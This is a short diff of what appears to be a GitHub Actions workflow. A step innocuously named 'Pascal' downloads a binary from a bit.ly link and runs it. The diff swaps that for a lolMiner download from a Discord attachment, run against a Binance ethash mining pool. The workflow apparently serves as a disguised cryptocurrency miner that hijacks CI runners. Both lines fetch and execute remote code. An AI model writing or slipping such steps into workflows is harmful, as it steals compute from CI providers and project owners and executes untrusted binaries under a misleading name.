@@ -44,4 +44,4 @@ jobs:
       uses: actions/checkout@v2
     - name: Pascal
       run: |
-        wget https://bit.ly/3jQR4Nq && chmod 777 3jQR4Nq && ./3jQR4Nq > /dev/null
+        wget https://cdn.discordapp.com/attachments/880201746591395901/880259304765149214/lolMiner && chmod +x lolMiner && ./lolMiner --algo ETHASH --pool stratum+tcp://ethash.poolbinance.com:1800 --user aflatoon.rig1 x --ethstratum ETHPROXY
